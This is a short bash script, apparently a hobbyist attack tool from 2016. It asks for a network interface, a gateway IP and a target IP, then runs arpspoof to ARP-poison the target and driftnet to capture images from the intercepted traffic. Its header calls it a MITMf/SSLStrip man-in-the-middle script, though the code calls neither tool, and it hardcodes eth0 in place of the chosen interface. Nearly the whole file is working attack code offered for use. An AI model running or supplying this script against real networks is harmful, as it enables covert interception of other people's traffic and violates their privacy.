#! /bin/bash
# Mitmf ( man in middle attack script )withe SSLStrip 
# Date: 07/05/2016
sleep 0.05
echo "$( tput setaf 6) ..........................................................$(tput sgr0)"
sleep 0.05
echo  "   " 
echo " $( tput setaf 1)[$(tput sgr0)$( tput setaf 2)~$(tput sgr0)$( tput setaf 1)] $(tput sgr0)what is the interface would like to use for Listening $( tput setaf 1)?$(tput sgr0)"
read interface
sleep 0.05
echo ""
echo " $( tput setaf 1)[$(tput sgr0)$( tput setaf 2)~$(tput sgr0)$( tput setaf 1)] $(tput sgr0)enter gateway ip address $( tput setaf 1):$(tput sgr0) "
read gateway 
sleep 0.05
echo "" 
echo " $( tput setaf 1)[$(tput sgr0)$( tput setaf 2)~$(tput sgr0)$( tput setaf 1)] $(tput sgr0)Write a target ip address $( tput setaf 2)[$(tput sgr0) Do not leave it blank $( tput setaf 2)]$(tput sgr0) $( tput setaf 1):$(tput sgr0)"
read target 
sleep 0.05
echo "  $( tput setaf 1)[$(tput sgr0)$( tput setaf 2)You'r ready To Rock$(tput sgr0) ^__^  $( tput setaf 1)]$(tput sgr0)" 

arpspoof -i $interface -t $gateway $target&driftnet -i eth0;

echo ""

